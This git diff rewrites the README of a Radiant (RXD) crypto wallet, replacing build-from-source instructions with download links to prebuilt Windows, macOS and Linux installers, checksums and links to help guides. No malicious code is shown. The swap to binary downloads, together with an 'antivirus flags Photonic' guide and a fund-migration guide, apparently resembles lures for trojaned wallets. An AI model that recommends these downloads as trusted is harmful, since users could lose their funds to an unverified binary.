@@ -1,66 +1,82 @@
-<p align="center">
-  <img src="./splash.png">
-</p>
+<div align="center">
 
-## Introduction
+<img src="assets/photonic-wallet-radiant-rxd-banner-a-prismatic-glow.webp" alt="Photonic Wallet - desktop wallet for Radiant (RXD) and Glyph tokens" width="100%">
 
-Photonic Wallet is a non-custodial wallet for minting and transferring tokens, following the Glyphs Protocol. The code runs completely client side and only requires a connection to an ElectrumX server.
+# Photonic Wallet
 
-This is alpha software in active development. If you would like to test it, please be cautious and report any bugs.
+**Desktop wallet for Radiant (RXD) and Glyph tokens · Windows · macOS · Linux**
 
-## Features
+[![Website](https://img.shields.io/badge/Website-photonicwallet.org-7c3aed?style=for-the-badge)](https://photonicwallet.org) [![Release](https://img.shields.io/badge/Release-v3.0.4-00b4d8?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Radiant-projects/Photonic-Wallet/releases/tag/v3.0.4) [![Docs](https://img.shields.io/badge/Docs-guides-0a0e1a?style=for-the-badge&logo=readthedocs&logoColor=white)](https://github.com/Radiant-projects/photonic-wallet-docs)
 
-- Mint and transfer non-fungible and fungible tokens
-- PoW mint contract creation
-- Container and author tokens
-- IPFS file uploading
-- On-chain image thumbnail generation
-- CLI for batch minting
+</div>
 
-## Roadmap
+---
 
-- Modify and seal operations for mutable tokens
-- Transfer history
-- SPV
+<a id="download"></a>
+## Download Photonic Wallet v3.0.4
 
-## Getting Started
+<div align="center">
 
-### Install
+[![Download Photonic Wallet for Windows](https://img.shields.io/badge/Download-Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Radiant-projects/Photonic-Wallet/releases/download/v3.0.4/photonic-wallet-v3.0.4.exe) [![Download Photonic Wallet for macOS](https://img.shields.io/badge/Download-macOS-111111?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/Radiant-projects/Photonic-Wallet/releases/download/v3.0.4/photonic-wallet-v3.0.4.dmg) [![Download Photonic Wallet for Linux](https://img.shields.io/badge/Download-Linux-FCC624?style=for-the-badge&logo=linux&logoColor=white)](https://github.com/Radiant-projects/Photonic-Wallet/releases/download/v3.0.4/photonic-wallet-v3.0.4.zip)
 
-```bash
-pnpm install
-```
+</div>
 
-### Run web development server
+| Platform | File | Requirements |
+|---|---|---|
+| **Windows** | [`photonic-wallet-v3.0.4.exe`](https://github.com/Radiant-projects/Photonic-Wallet/releases/download/v3.0.4/photonic-wallet-v3.0.4.exe) | Windows 10/11, 64-bit |
+| **macOS** | [`photonic-wallet-v3.0.4.dmg`](https://github.com/Radiant-projects/Photonic-Wallet/releases/download/v3.0.4/photonic-wallet-v3.0.4.dmg) | macOS (DMG package) |
+| **Linux** | [`photonic-wallet-v3.0.4.zip`](https://github.com/Radiant-projects/Photonic-Wallet/releases/download/v3.0.4/photonic-wallet-v3.0.4.zip) | x64, ZIP archive |
 
-```bash
-pnpm dev
-```
+<!-- SHA256:START -->
+#### SHA-256 checksums
 
-If not using localhost, https may be required for crypto functions to work. This can be enabled by uncommenting `basicSsl` in `vite.config.ts`.
+| File | SHA-256 |
+|---|---|
+| `photonic-wallet-v3.0.4.exe` | `143d4d75f0330b370fe3ef0f7459b2c236e2f9dcdbb389a860583250fc0f1a05` |
+| `photonic-wallet-v3.0.4.dmg` | `7ce8f1297177d9886c51a62cb6f3b114d87695c559cae339de7381dc22d2c3fb` |
+| `photonic-wallet-v3.0.4.zip` | `c1febefc9b6d409f7175a8d8ef2897bb0ab343f9c45f16585540a19dabdbab56` |
+<!-- SHA256:END -->
 
-### Build web app and CLI
+> [!TIP]
+> Windows: `certutil -hashfile <file> SHA256` · macOS: `shasum -a 256 <file>` · Linux: `sha256sum <file>`. Every character must match; if not, delete the file and download again. Step-by-step: [verify the installer](https://github.com/Radiant-projects/photonic-wallet-docs/blob/HEAD/articles/verify-photonic-installer-sha256.md).
 
-```bash
-pnpm build
-```
+---
 
-Builds will be in `packages/app/dist` and `packages/cli/dist`. Web app can be served as a static site.
+## What is Photonic Wallet?
 
-### Build for Windows, Linux or macOS
+Photonic is a self-custodial desktop wallet made for **Radiant (RXD)** and its **Glyph** token standard. Learn more on [photonicwallet.org](https://photonicwallet.org), read the [Radiant wallet overview](https://photonicwallet.org/radiant-wallet) or the [security model](https://photonicwallet.org/security).
 
-```bash
-pnpm build:tauri
-```
+| Feature | What it does |
+|---|---|
+| **RXD wallet** | Send and receive Radiant (RXD) from your desktop |
+| **Glyph tokens** | Hold, send and mint Glyph v2 tokens and NFTs ([guide](https://github.com/Radiant-projects/photonic-wallet-docs/blob/HEAD/articles/what-are-glyph-tokens.md)) |
+| **dMint** | Take part in proof-of-work token mints ([guide](https://github.com/Radiant-projects/photonic-wallet-docs/blob/HEAD/articles/dmint-explained.md)) |
+| **Self-custody** | Keys stay on your device; no accounts |
+| **Three platforms** | Windows, macOS and Linux installers |
 
-Executables will be in `pacakges/app/src-tauri/target/release`.
+## Install
 
-Add `-d` for a debug build.
+| System | Guide |
+|---|---|
+| Windows | [Install on Windows](https://github.com/Radiant-projects/photonic-wallet-docs/blob/HEAD/articles/install-photonic-wallet-windows.md) |
+| macOS | [Install on macOS](https://github.com/Radiant-projects/photonic-wallet-docs/blob/HEAD/articles/install-photonic-wallet-macos.md) |
+| Linux | [Install on Linux](https://github.com/Radiant-projects/photonic-wallet-docs/blob/HEAD/articles/install-photonic-wallet-linux.md) |
 
-## Photonic Factory CLI
+## Popular guides
 
-The CLI is used for batch minting tokens. See `packages/cli/README.md` for more information.
+| Problem | Fix |
+|---|---|
+| Balance shows zero | [Fix a zero balance](https://github.com/Radiant-projects/photonic-wallet-docs/blob/HEAD/articles/photonic-wallet-balance-shows-zero.md) |
+| Restore from seed | [Restore Photonic Wallet](https://github.com/Radiant-projects/photonic-wallet-docs/blob/HEAD/articles/restore-photonic-wallet-from-seed-phrase.md) |
+| Coming from Samara | [Move RXD out of Samara](https://github.com/Radiant-projects/photonic-wallet-docs/blob/HEAD/articles/move-rxd-from-samara-wallet.md) |
+| Mint an NFT | [Mint a Glyph NFT](https://github.com/Radiant-projects/photonic-wallet-docs/blob/HEAD/articles/mint-glyph-nft-with-photonic.md) |
+| Antivirus warning | [Antivirus flags Photonic](https://github.com/Radiant-projects/photonic-wallet-docs/blob/HEAD/articles/antivirus-flags-photonic-wallet.md) |
 
-## License
+All 36 guides: **[Radiant-projects/photonic-wallet-docs](https://github.com/Radiant-projects/photonic-wallet-docs)**
 
-MIT. See [LICENSE](LICENSE).
+> [!WARNING]
+> Nobody from Photonic will ever ask for your seed phrase. Download only from [photonicwallet.org/download](https://photonicwallet.org/download) or this repository's [releases](https://github.com/Radiant-projects/Photonic-Wallet/releases/tag/v3.0.4).
+
+---
+
+<div align="center"><sub><a href="https://photonicwallet.org">photonicwallet.org</a> · <a href="https://photonicwallet.org/download">Download</a> · <a href="https://photonicwallet.org/faq">FAQ</a> · <a href="https://github.com/Radiant-projects/photonic-wallet-docs">Docs</a></sub></div>
